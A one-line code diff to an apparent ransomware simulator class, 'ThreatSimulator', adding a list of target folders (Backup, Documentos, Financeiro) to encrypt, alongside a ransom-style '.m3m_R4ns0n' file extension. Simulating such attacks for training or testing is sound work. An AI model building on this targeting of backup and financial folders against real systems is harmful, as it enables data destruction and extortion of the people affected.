@@ -17,6 +17,7 @@ class ThreatSimulator:
         self.backup = os.path.join(self.home_directory, "Backup")
         self.documentos = os.path.join(self.home_directory, "Documentos")
         self.financeiro = os.path.join(self.home_directory, "Financeiro")
+        self.directories_to_encrypt = [self.backup, self.documentos, self.financeiro]
         self.extension = ".m3m_R4ns0n"
 
     def generate_key(self, password: bytes) -> bytes:
